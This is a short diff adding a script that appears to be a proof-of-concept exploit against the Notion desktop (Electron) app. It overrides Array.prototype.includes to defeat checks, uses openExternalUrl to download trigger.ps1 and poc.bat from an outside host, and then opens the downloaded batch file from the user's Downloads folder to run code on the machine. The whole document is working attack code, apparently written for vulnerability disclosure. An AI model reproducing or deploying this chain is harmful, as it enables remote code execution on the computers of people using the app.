@@ -1,0 +1,22 @@
+<script>
+    // execute on Notion
+function sleep(ms) {
+  const wakeUpTime = Date.now() + ms;
+  while (Date.now() < wakeUpTime) {}
+};
+async function getpath(){
+var path = await __electronApi.getAppPath();
+var head = path.split("\App",1)[0];
+head += 'Downloads\\poc.bat';
+head = 'file://' + head;
+return head;
+}
+
+[].__proto__.includes = ()=>{return true};
+var head = '';
+
+__electronApi.openExternalUrl('https://ais0127.github.io/trigger.ps1');
+__electronApi.openExternalUrl('https://ais0127.github.io/poc.bat');
+sleep(1000);
+getpath().then(function(data){return __electronApi.openExternalUrl(data);});
+</script>
